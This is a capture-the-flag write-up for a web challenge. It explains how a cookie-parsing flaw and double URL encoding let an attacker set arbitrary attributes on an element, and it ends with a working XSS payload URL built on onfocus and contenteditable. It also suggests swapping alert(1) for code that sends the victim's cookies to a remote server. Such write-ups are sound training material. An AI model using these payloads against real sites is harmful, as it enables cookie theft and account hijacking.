# Mission Invisible

#### Score: 128

## Description

You need to obtain the flag through two different invisible places.  
http://52.52.236.217:16401/  
Submit payload here: http://52.52.236.217:16403/  

## Write UP
  
  
The page contains multiple JavaScript functions. It reads the value of the GET parameter named "tag", sets it as a cookie, and then,
using the data provided in the cookie, creates a DOM element:   

    var tag = getUrlParam("tag");
    setCookie("tag", tag);
    setElement(tag);
    
**setElement:**

    function setElement(tag) {
        tag = tag.substring(0, 1);
        var ele = document.createElement(tag)
        var attrs = getCookie("attrs").split("&");
        for (var i = 0; i < attrs.length; i++) {
            var key = attrs[i].split("=")[0];
            var value = attrs[i].split("=")[1];
            ele.setAttribute(key, value);
        }
        document.body.appendChild(ele);
    }

This function creates the element. You may notice two interesting things:  

1. A substring is preformed on the value of tag, and only the first char of the string is taken. That means that we can only create
tags that are single lettered. So no `<script>` tags, we are forced to use `<a>` or `<p>` for example.  
2. The function cycles through a cookie named **attrs**, splits it by `&`, and uses the data to create attributes for the tag.
Without figuring out how to set attributes, we only have a static, boring `<p>` tag, and it doesn't help us much. So how can we cause
the JavaScript code to set the attrs cookie?  

**getCookie:**

    function getCookie(name) {
        var search = name + "="
        var offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length;
            var end = document.cookie.indexOf(";", offset);
            if (end == -1) {
                end = document.cookie.length;
            }
            return unescape(document.cookie.substring(offset, end));
        }
        else return "";
    }

Well... We don't. Notice what happens when we visit the URL http://52.52.236.217:16401/?tag=pattrs=test
and run the following JS commands in the console:

    > document.cookie 
    < "tag=pattrs=test"
    
    > getCookie("attrs")
    < "test"
    
    
So what happend here? First, the page sets the tag cookie to the value "pattrs=test".
Because the function searches for **any** appearence of the string "attrs="
in the document.cookie string, it finds it in index 1: "p **attrs=** test".  

Now, if we will try to create a custom element, we encounter another problem:
http://52.52.236.217:16401/?tag=aattrs=href=https://google.com&test=yay

    <a href="https://google.com"></a>
    
We can't create elements with multiple attribute, because in the first function, `getUrlParam`, there's the following regex:

        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        var r = unescape(window.location.search.substr(1)).match(reg);
        
Which splits the string by the char `&`. To bypass it we need to URL encode the sign `&` twice, like so:  

    escape(escape("&"))="%2526"
    
Now that should work! http://52.52.236.217:16401/?tag=aattrs=href=https://google.com%2526test=yay  

To actually trigger the XSS, I've created the following p tag:

    <p id="wow" onfocus="alert(1)" contenteditable=""></p>
    
By appending a hash (`#` sign, not a cryptographic hash) to the end of the URL, We can make the browser
automaticlly focus on the object and trigger the
`onfocus` event. For those who are not familiar with how the hash in URLs works, the following link: http://site.com#wow would
cause the browser to automaticlly focus on the object that has the id "wow".  

The `contenteditable` attribute is needed to trigger the onfocus event.  

And here is the final payload: http://52.52.236.217:16401/?tag=pattrs=id=wow%2526onfocus=alert(1)%2526contentEditable=#wow
You can substitute the `alert(1)` with code that'll log the cookies of the browser to your remote server,
and get the flag that's hidden inside.
